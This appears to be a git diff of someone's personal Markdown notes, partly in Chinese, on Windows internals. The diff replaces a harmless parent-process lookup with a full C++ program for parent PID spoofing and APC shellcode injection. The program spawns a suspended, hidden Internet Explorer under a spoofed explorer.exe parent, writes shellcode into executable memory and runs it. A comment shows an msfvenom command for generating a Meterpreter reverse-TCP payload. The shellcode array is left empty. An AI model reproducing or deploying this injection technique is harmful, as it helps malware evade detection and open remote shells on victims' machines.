@@ -23,6 +23,8 @@ categories: others
   比如如果你在做其它的事情了? 会被 激活 hwnd 给中断掉,
   也许不需要激活 hwnd , 直接传递 MSG 就可以了
 
+<https://github.com/ttttupup/wxhelper/wiki>
+
 ### Tools
 
 - ProcessExplorer 用于查看进程信息
@@ -39,87 +41,62 @@ categories: others
 
 ### codes
 
-```c
-// GetProcessParentID
-#include <stdio.h>
-#include <windows.h>
-#include <tlhelp32.h>
+[PPID Spoofing](https://pentestlab.blog/2020/02/24/parent-pid-spoofing/)
+[rich-edit-controls](https://docs.microsoft.com/en-us/windows/win32/controls/about-rich-edit-controls)
 
-int main(int argc, char *argv[]) 
-{
-    int pid = -1;
-    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    PROCESSENTRY32 pe = { 0 };
-    pe.dwSize = sizeof(PROCESSENTRY32);
-
-    //assume first arg is the PID to get the PPID for, or use own PID
-    if (argc > 1) {
-        pid = atoi(argv[1]);
-    } else {
-        pid = GetCurrentProcessId();
-    }
-
-    if( Process32First(h, &pe)) {
-        do {
-            if (pe.th32ProcessID == pid) {
-                printf("PID: %i; PPID: %i\n", pid, pe.th32ParentProcessID);
-            }
-        } while( Process32Next(h, &pe));
-    }
-
-    CloseHandle(h);
-}
-```
-
+<https://github.com/hlldz/APC-PPID>
 
 ```c++
 #include <windows.h>
-#include <tlhelp32.h>
+#include <TlHelp32.h>
+#include <iostream>
 
-// https://pentestlab.blog/2020/02/24/parent-pid-spoofing/
-DWORD explorerID() {
-    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    PROCESSENTRY32 process = { 0 };
-    process.dwSize = sizeof(process);
- 
-    if (Process32First(snapshot, &process)) {
-        do {
-            //If you want to another process as parent change here
-            if (!wcscmp(process.szExeFile, L"explorer.exe"))
-                break;
-        } while (Process32Next(snapshot, &process));
-    }
- 
-    CloseHandle(snapshot);
-    return process.th32ProcessID;
+DWORD getParentProcessID() {
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	PROCESSENTRY32 process = { 0 };
+	process.dwSize = sizeof(process);
+
+	if (Process32First(snapshot, &process)) {
+		do {
+            		//If you want to another process as parent change here
+			if (!wcscmp(process.szExeFile, L"explorer.exe"))
+				break;
+		} while (Process32Next(snapshot, &process));
+	}
+
+	CloseHandle(snapshot);
+	return process.th32ProcessID;
 }
-// DWORD ppid;
 
+int main() {
 
+	//Shellcode, for example; msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x EXITFUNC=thread -f c
+	unsigned char shellCode[] = "";
 
+	STARTUPINFOEXA sInfoEX;
+	PROCESS_INFORMATION pInfo;
+	SIZE_T sizeT;
 
+	HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, getParentProcessID());
 
+	ZeroMemory(&sInfoEX, sizeof(STARTUPINFOEXA));
+	InitializeProcThreadAttributeList(NULL, 1, 0, &sizeT);
+	sInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT);
+	InitializeProcThreadAttributeList(sInfoEX.lpAttributeList, 1, 0, &sizeT);
+	UpdateProcThreadAttribute(sInfoEX.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &expHandle, sizeof(HANDLE), NULL, NULL);
+	sInfoEX.StartupInfo.cb = sizeof(STARTUPINFOEXA);
 
-SIZE_T cbSize = 0;
-InitializeProcThreadAttributeList(NULL, 1, 0, &cbSize);
-PPROC_THREAD_ATTRIBUTE_LIST attrThread = HeapAlloc(GetProcessHeap(), 0, cbSize);
-InitializeProcThreadAttributeList(attrThread, 1, 0, &cbSize);
-CurrentProcessAdjustToken();
-HANDLE hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ppid);
+	CreateProcessA("C:\\Program Files\\internet explorer\\iexplore.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast<LPSTARTUPINFOA>(&sInfoEX), &pInfo);
 
-UpdateProcThreadAttribute(attrThread, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)
+	LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(pInfo.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	SIZE_T *lpNumberOfBytesWritten = 0;
+	BOOL resWPM = WriteProcessMemory(pInfo.hProcess, lpBaseAddress, (LPVOID)shellCode, sizeof(shellCode), lpNumberOfBytesWritten);
 
-PROCESS_INFORMATION procInfo;
-STARTUPINFOEX startInfo = {
-	.cb = sizeof(STARTUPINFOEX)
-};
-startInfo.lpAttributeList  = attrThread;
-CreateProcess(NULL, argv[1], NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &startInfo.StartupInfo, &procInfo);
-DeleteProcThreadAttributeList(pAttributeList);
-CloseHandle(hParentProcess);
+	QueueUserAPC((PAPCFUNC)lpBaseAddress, pInfo.hThread, NULL);
+	ResumeThread(pInfo.hThread);
+	CloseHandle(pInfo.hThread);
+
+	return 0;
+}
+
 ```
-
-
-
-[PPID Spoofing]:https://pentestlab.blog/2020/02/24/parent-pid-spoofing/
-(rich-edit-controls):https://docs.microsoft.com/en-us/windows/win32/controls/about-rich-edit-controls
